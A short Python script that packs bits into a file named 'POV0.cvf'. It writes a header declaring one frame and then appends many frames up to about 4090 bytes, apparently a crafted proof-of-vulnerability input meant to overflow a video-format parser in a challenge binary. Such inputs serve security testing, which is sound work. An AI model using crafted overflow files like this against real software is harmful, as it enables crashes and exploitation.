import struct

def bitsNeeded ( cnt ):
        if cnt == 0:
                return 1

        z = 0

        while ( cnt ):
                z += 1
                cnt >>= 1

        return z

class bitstream:
        def __init__( self ):
                ### pdata is the final output stream
                ### It is written to when the bits reach 8
                self.pdata = ''

                ### Current number of bits in the queue
                self.cbit = 0

                ### Current value being appended to
                self.tvalue = 0

                return

        def appendBits( self, value, bitCount ):
                for bc in range(bitCount):
                        nextBit = (value >> ( bitCount - (bc+1) ) ) & 1

                        self.tvalue |= (nextBit << (7-self.cbit))
                        self.cbit += 1

                        ### If we have filled up a byte then pack it up
                        if self.cbit == 8:
                                self.pdata += struct.pack('B', self.tvalue)
                                self.cbit = 0
                                self.tvalue = 0

                return bitCount

        def padItOut( self ):
                ### If there are remaining bits pack them on
                if self.cbit != 0:
                        self.pdata += struct.pack('B', self.tvalue)
                        self.cbit = 0
                        self.tvalue = 0

                return

        def outStream( self ):
                return self.pdata

if __name__ == '__main__':
	bs = bitstream()

	### Add Magic
	bs.appendBits( 0x00435646, 32 )

	### Header
	bs.appendBits( 0x1111, 16 )
	
	### Height
	bs.appendBits( 0x02, 8 )

	### Width
	bs.appendBits( 0x04, 8 )

	### Frame count
	### Only setting framecount to 1
	bs.appendBits( 0x0001, 16 )
	
	### Append frames until max size is reached
	while len(bs.outStream()) < 4090:
		### Append frame value
		bs.appendBits( 0x5555, 16 )

		## Flag will be 0x08 since it will be a full frame and
		## And it will just use the first standard dictionary
		bs.appendBits( 0x08, 8 )

		## Append height * width bits
		bs.appendBits( 0xff, 8 )

	bs.padItOut()

	data = bs.outStream()

	data = data

	f = open('POV0.cvf', 'wb')
	f.write(data)
	f.close()
